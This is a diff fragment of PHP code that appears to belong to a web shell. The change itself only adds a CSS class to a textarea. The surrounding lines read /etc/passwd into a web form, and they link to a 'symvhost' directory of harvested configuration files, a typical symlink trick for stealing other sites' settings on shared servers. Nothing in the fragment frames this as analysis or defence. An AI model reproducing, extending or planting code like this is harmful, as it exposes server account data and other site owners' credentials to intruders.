@@ -113,7 +113,7 @@ IndexIgnore *";
 <br><br><a href="symvhost/" target="_blank">Configurations</a></center>';
     	}
     } else {
-       echo '<form method="post" action=""><textarea name="passwd" rows="20" cols="100">
+       echo '<form method="post" action=""><textarea class="bigarea" name="passwd" rows="20" cols="100">
 ';
 if(is_readable('/etc/passwd')) {
   readfile("/etc/passwd") or include ("/etc/passwd") or die("Unable to open file!");
